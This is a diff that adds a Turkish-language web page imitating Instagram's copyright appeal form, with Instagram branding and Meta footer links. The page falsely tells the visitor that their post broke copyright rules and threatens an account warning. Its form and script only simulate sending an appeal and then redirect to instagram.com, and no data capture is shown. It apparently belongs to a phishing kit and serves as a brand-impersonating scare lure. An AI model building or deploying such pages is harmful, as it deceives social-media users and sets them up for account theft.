@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>İtiraz Gönder</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="../../../logo.png" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <img src="../img/instagraa.png" alt="Instagram Logo">
+            </div>
+        </div>
+
+        <div class="content">
+            <h2>İçerik İtirazı Gönder</h2>
+            <p>Gönderinizin, Instagram'ın telif hakları kurallarını ihlal ettiği tespit edilmiştir. Bu formu kullanarak itirazda bulunabilirsiniz. İtirazınızın sonucu en geç 24 saat içinde değerlendirilecektir. İtiraz sonucu haksız bulunmanız durumunda hesabınıza uyarı eklenebilir.</p>
+            
+            <form id="appeal-form">
+                <label for="reason">İtiraz Nedeni</label>
+                <select name="reason" id="reason" required>
+                    <option value="" disabled selected>Nedeni Seçin</option>
+                    <option value="Yanlış Telif İhlali">Yanlış Telif İhlali</option>
+                    <option value="Adil Kullanım">Paylaşım, adil kullanım kapsamındadır.</option>
+                    <option value="Orijinal İçerik">İçerik, tarafıma ait orijinal bir çalışmadır.</option>
+                    <option value="Diğer">Telif hakkı sahibinden yazılı izin alınmıştır.</option>
+                    <option value="Diğer">Eleştiri ve yorum hakkı kapsamında paylaşılmıştır..</option>
+                    <option value="Diğer">İçerik, ticari bir amaç taşımadan paylaşılmıştır.</option>
+                    <option value="Diğer">Kamuya açık kaynaklardan alınarak düzenlenmiştir.</option>
+                    <option value="Diğer">Telif hakkı sahibinin verdiği açık izin belgelenmiştir.</option>
+                </select>
+                <button type="submit" class="button">İtirazı Gönder</button>
+            </form>
+        </div>
+
+        <footer class="footer">
+            <div class="footer-links">
+                <a href="#">Meta</a>
+                <a href="https://about.instagram.com/about-us">Hakkında</a>
+                <a href="#">Blog</a>
+                <a href="https://about.instagram.com/about-us/careers/">İş Fırsatları</a>
+                <a href="#">Yardım</a>
+                <a href="https://developers.facebook.com/docs/instagram-platform">API</a>
+                <a href="https://privacycenter.instagram.com/policy">Gizlilik</a>
+                <a href="https://help.instagram.com/581066165581870/">Koşullar</a>
+                <a href="#">Konumlar</a>
+                <a href="#">Meta Verified</a>
+            </div>
+            <p>&copy; 2024 Meta. Tüm hakları saklıdır.</p>
+        </footer>
+    </div>
+
+    <div id="popup" class="popup">
+        <div class="popup-content">
+            <h2>İtiraz Gönderiliyor...</h2>
+            <div class="loader"></div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('appeal-form').addEventListener('submit', function(e) {
+            e.preventDefault(); // Sayfanın yeniden yüklenmesini engelle
+            
+            // Popup göster
+            document.getElementById('popup').style.display = 'flex';
+            
+            // Yükleme süreci simülasyonu
+            setTimeout(function() {
+                document.querySelector('.popup-content').innerHTML = `
+                    <h2>İtiraz Gönderildi</h2>
+                     <a href="https://www.instagram.com" class="button-centered">Çıkış Yap</a>
+            `;
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
